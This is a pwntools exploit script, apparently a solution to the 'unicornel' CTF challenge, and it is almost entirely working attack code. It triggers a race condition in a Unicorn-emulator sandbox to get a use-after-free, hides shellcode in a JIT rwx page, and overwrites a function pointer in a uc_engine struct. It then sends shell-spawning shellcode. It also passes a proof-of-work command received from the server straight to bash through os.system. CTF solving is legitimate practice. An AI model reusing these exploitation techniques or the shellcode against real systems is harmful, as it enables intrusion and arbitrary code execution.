from pwn import *
import os

context.update(os="linux", arch="amd64")
elf = context.binary = ELF("./chal")
libc = ELF("libc.so.6")

if args.REMOTE:
	p = remote("unicornel.2024.ctfcompetition.com", 1337)
	p.recvuntil(b"solver with:")
	pow_command = p.recvuntil(b"===================", drop=True).strip()
	print(pow_command)
	os.system(b"/bin/bash -c '" + pow_command + b"' > pow_answer")
	with open("pow_answer", "rb") as pow_f:
		p.sendlineafter(b"Solution? ", pow_f.read())
else:
	p = elf.process()
	if args.GDB:
		gdb.attach(p)
		pause()

# constants copied from unicorn/unicorn.h in unicorn source code
UC_ARCH_X86 = 4
UC_MODE_32 = 4
UC_MODE_64 = 8
UC_ARCH_ARM64 = 2
UC_ARCH_ARM = 1
UC_MODE_ARM = 0

# create a unicornelf file format (specified in the challenge Documentation)
def create_unielf(arch, mode, maps, code_len, num_maps):
	unielf = p32(arch) + p32(mode)
	for m in maps:
		unielf += p64(m[0]) + p64(m[1])
	unielf = unielf.ljust(0x48, b"\0")
	unielf += p16(code_len) + p8(num_maps)
	unielf = unielf.ljust(0x50, b"\0")
	return unielf

# start a process with given arch/mode, memory mappings, and code
def start_process(arch, mode, maps, code):
	unielf = create_unielf(arch, mode, maps, len(code), len(maps))
	p.send(unielf)
	p.sendafter(b"CODE_START\n", code)

# x86 code for first thread
x86_code = asm("\n".join([
	"beginning:",
	
	# create a shared buffer with handle 0
	"mov rax, 3",
	"mov rbx, 0x5000",
	"int 0x80",

	# print the handle number of the shared buffer for debugging
	"mov rbx, rax",
	"mov rax, 2",
	"int 0x80",

	# allocate a fastbin with write() syscall to prevent consolication of free'd shared buf with top chunk
	"mov rax, 1",
	"mov rbx, 0x1000",
	"mov rcx, 0x18",
	"int 0x80",

	# blocking resume => wait until the aarch64 thread calls pause() and then resume it => sync both threads
	"pause_1:",
	"mov rax, 10",
	"mov rbx, 1",
	"int 0x80",
	"cmp eax, -1",
	"je pause_1",
	
	# blocking resume again
	"pause_2:",
	"mov rax, 10",
	"mov rbx, 1",
	"int 0x80",
	"cmp eax, -1",
	"je pause_2",

	# map the shared memory buffer with handle 0 => trigger the race condition
	"mov rax, 4",
	"mov rbx, 0x8000",
	"mov rcx, 0x5000",
	"mov rdx, 0",
	"int 0x80",

	# check if we have UAF
	"cmp rax, 0",	# check if buffer was free'd before being mapped, so map_shared returned an error
	"jne beginning",	# try again
	"cmp qword ptr [0x8000], 0",	# check if the shared buffer we mapped is a free'd chunk (malloc_chunk fd ptr is written in it)
	"jne exploit_uaf",	# we have UAF in this case!

	# unmap the buffer and try again if buffer was mapped before ref==1 check in rewind(), so it was never free'd
	"mov rax, 5",
	"int 0x80",
	"jmp beginning",

	# exploit UAF! => first print our leak (the fd pointer of now freed chunk) to make sure it worked
	"exploit_uaf:",
	"mov rax, 2",
	"mov rbx, qword ptr [0x8000]",
	"int 0x80",

	# smuggle shellcode into JIT-compiled code that will be written to an rwx page mapped by unicorn
	"mov rax, 0x46eb706aff315e50",	# push rax; pop rsi; xor edi, edi; push 0x70; jmp next_part
	"mov qword ptr [0x4020], rax",
	"mov rax, 0xccabeb050fc0315a",	# pop rdx; xor eax, eax; syscall; jmp previous_part (now 2nd_stage shellcode)
	"mov qword ptr [0x4020], rax",
	"mov rax, 0xcccccccccccccccc",	# I put these here first to have more space for shellcoding
	"mov qword ptr [0x4020], rax",	# but decided to not erase them to not change the offset of shellcode
	"mov rax, 0xcccccccccccccccc",	# in rwx page and not have to adjust it again :)
	"mov qword ptr [0x4020], rax",
	"mov rax, 0xcccccccccccccccc",
	"mov qword ptr [0x4020], rax",
	"mov rax, 0xcccccccccccccccc",
	"mov qword ptr [0x4020], rax",
	"mov rax, 0xcccccccccccccccc",
	"mov qword ptr [0x4020], rax",
	
	# This line was left here after debugging and although it has no effect, I realized the exploit breaks if I comment it :|
	# I replaced it with an equal length of nops and the code still worked, so apparently it's related to the code size
	# (maybe changes the heap layout if paer of our code is somehow allocated on the heap by unicorn)
	"mov rcx, 0x18",	# wtf???
	# "nop","nop","nop","nop","nop","nop","nop",	# replace the line above with this and it still works

	# switch arch to the arm code to allocate a new uc_engine struct with uc_open()
	# this uc_engine instance is now allocated in the same UAF'd space that our shared buffer used.
	"mov rax, 8",
	"mov rbx, 1",
	"mov rcx, 0",
	"lea rdx, [rip+after_switch_arch]",
	"int 0x80",

	"jmp .",	# infinite loop for debugging if we comment out the switch arch call
	
	"after_switch_arch:",
]), arch="amd64")

# arm code used after switch_arch in the x86 code in first thread
x86_code += asm("\n".join([
	# print an integer to make sure switch_arch succeeded
	"mov r0, #2",
	"mov r1, #123",
	"svc #0",

	# # write 0xdeadbeef into arm_reg_read function ptr in uc_engine struct
	# "mov r1, #0x8138",
	# "mov r2, #0xdead",
	# "lsl r2, #8",
	# "orr r2, r2, #0xbe",
	# "lsl r2, #8",
	# "orr r2, r2, #0xef",
	# "str r2, [r1]",

	# write shellcode addr into arm_reg_read function ptr in uc_engine struct
	"mov r0, #0x8138",
	"mov r1, #0x8008",
	"ldr r2, [r1]",
	"ldr r3, [r1, #4]",	# load a leak from the rwx JIT page that is on the heap
	"mov r4, #0x24d",
	"adds r2, r2, r4",	# add an offset to the leak to make it point to our shellcode
	"adc r3, r3, #0",
	"str r2, [r0]",
	"str r3, [r0, #4]",	# write the address into arm_reg_read funcptr

	# print integer => this will cause a call to hook_call which calls uc_reg_read(), which then calls arm_reg_read func ptr
	"mov r0, #2",
	"mov r1, #123",
	"svc #0",

	# infinite loop for debugging if it didn't work
	"b ."
]), arch="arm")

aarch64_code = asm("\n".join([
	# flag = 0 => a variable in memory to know if we've already called rewind
	"beginning:",
	"mov x0, #0x4000",
	"mov w1, #0",
	"str w1, [x0]",
	# pause and wait for x86 thread to resume us => sync threads
	"mov x0, #9",
	"svc #0",
	# bookmark
	"mov x0, #6",
	"svc #0",
	# check flag => if we've come here after a call to rewind, flag should be 1 and we should go back to the beginning
	"mov x0, #0x4000",
	"ldr w1, [x0]",
	"cmp w1, #1",
	"b.eq beginning",
	# set flag to 1 to know that we've rewound the next time we come here
	"mov w1, #1",
	"str w1, [x0]",
	# map shared buffer #0
	"mov x0, #4",
	"mov x1, #0x8000",
	"mov x2, #0x5000",
	"mov x3, #0",
	"svc #0",
	# pause => sync with x86 thread
	"mov x0, #9",
	"svc #0",
	# rewind => trigger the race condition
	"mov x0, #7",
	"svc #0"
]), arch="aarch64")

# context.log_level = "DEBUG"
start_process(UC_ARCH_X86, UC_MODE_64, [(0x1000, 0x1000), (0x4000, 0x1000)], x86_code)
start_process(UC_ARCH_ARM64, UC_MODE_ARM, [(0x1000, 0x1000), (0x4000, 0x1000)], aarch64_code)
pause()	# wait for the first stage shellcode to execute and call read() for the second stage
# p.sendline(b"\xcc" * 0x40)
shellcode = asm(shellcraft.amd64.linux.sh())	# send the second stage shellcode
p.sendline(shellcode)

p.interactive()
